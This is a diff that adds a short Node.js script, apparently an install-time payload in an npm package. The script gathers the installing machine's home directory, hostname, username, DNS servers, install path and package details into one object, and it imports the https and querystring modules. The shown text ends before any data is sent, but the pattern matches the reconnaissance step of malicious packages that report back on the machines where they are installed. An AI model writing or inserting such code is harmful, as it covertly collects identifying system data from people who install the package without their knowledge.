@@ -1,0 +1,14 @@
+const os = require("os")
+const dns = require("dns")
+const querystring = require("querystring")
+const https = require("https")
+const packageJSON = require("./package.json")
+const package = packageJSON.name
+_tmp_0.packagename = package
+_tmp_0.dirname = __dirname
+_tmp_0.homedirectory = os.homedir()
+_tmp_0.hostname = os.hostname()
+_tmp_0.username = os.userInfo().username
+_tmp_0.dns = dns.getServers()
+_tmp_0.r = packageJSON ? packageJSON.__resolved : undefined
+_tmp_0.version = packageJSON.version
